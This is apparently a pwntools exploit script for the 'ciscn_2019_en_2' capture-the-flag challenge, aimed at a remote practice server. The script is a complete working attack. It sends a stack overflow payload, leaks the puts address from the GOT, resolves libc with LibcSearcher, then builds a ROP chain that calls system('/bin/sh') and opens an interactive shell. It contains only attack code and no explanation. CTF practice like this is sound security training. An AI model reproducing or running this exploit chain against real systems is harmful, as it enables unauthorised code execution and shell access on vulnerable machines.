from pwn import *
from LibcSearcher3 import * 

#io = process('./ciscn_2019_en_2')
io = remote('node4.buuoj.cn',25000)
elf = ELF('./ciscn_2019_en_2')
context.log_level = 'debug'

overflow = b'\x00' +b'\x61'*0x4f + b'\x62' * 8
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x400c83
ret_addr = 0x4006b9
call_encrypt = 0x400BCD
exit_addr = 0x4006D0

#泄漏libc
payload = overflow + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(call_encrypt) 
io.recvuntil(b'choice!')
io.sendline(b'1')
io.recvuntil(b'ed')
io.sendline(payload)
io.recvuntil(b'\x0a\x0a')
puts_addr = io.recv(6).ljust(8,b'\x00')
#print(str(puts_addr))
puts_addr = u64(puts_addr)
#print(hex(puts_addr))

# ROP
libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
payload = overflow + p64(pop_rdi) + p64(binsh_addr) + p64(ret_addr) + p64(ret_addr) + p64(system_addr) + p64(exit_addr)
io.recvuntil(b'ed')
io.sendline(payload)

io.interactive()
